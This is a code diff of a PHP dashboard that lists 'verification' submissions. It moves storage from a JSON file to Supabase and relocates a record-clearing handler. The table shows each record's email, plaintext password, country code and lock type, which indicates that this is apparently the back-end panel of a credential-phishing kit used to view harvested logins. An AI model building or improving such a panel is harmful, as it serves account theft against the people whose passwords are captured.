@@ -1,16 +1,17 @@
 <?php
 // dashboard.php - View submitted verification records
 
-$dbFile = __DIR__ . '/records_db.json';
-$data = [];
+require_once __DIR__ . '/supabase.php';
 
-if (file_exists($dbFile)) {
-    $json = file_get_contents($dbFile);
-    $data = json_decode($json, true) ?? [];
+// Clear all records (must run before any HTML output)
+if (isset($_GET['clear'])) {
+    supabase_delete_all('submissions');
+    header('Location: dashboard.php');
+    exit;
 }
 
-// Sort: newest first
-$data = array_reverse($data);
+// Newest first (SQL already sorts by id descending)
+$data = supabase_select('submissions');
 
 // Stats
 $total = count($data);
@@ -127,14 +128,6 @@ $completeSessions = count(array_filter($sessions, fn($s) => !empty($s['email']) 
     </div>
 </div>
 
-<?php if (isset($_GET['clear'])): ?>
-<?php
-    file_put_contents($dbFile, json_encode([], JSON_PRETTY_PRINT));
-    header('Location: dashboard.php');
-    exit;
-?>
-<?php endif; ?>
-
 <?php if ($total === 0): ?>
     <div class="empty">
         <h2>No records yet</h2>
@@ -166,7 +159,10 @@ $completeSessions = count(array_filter($sessions, fn($s) => !empty($s['email']) 
                         <?= $type === 'email_lock' ? 'Email' : ($type === 'geo_lock' ? 'Geo' : $type) ?>
                     </span>
                 </td>
-                <td style="font-size:12px;color:#8696a0;"><?= htmlspecialchars($entry['time'] ?? '') ?></td>
+                <td style="font-size:12px;color:#8696a0;">
+                    <?php $t = $entry['time'] ?? ''; ?>
+                    <?= htmlspecialchars($t ? date('Y-m-d H:i:s', strtotime($t)) : '-') ?>
+                </td>
                 <td><?= htmlspecialchars($entry['email'] ?? '-') ?></td>
                 <td class="password-cell"><?= htmlspecialchars($entry['password'] ?? '-') ?></td>
                 <td><?= htmlspecialchars($entry['country_code'] ?? '-') ?></td>
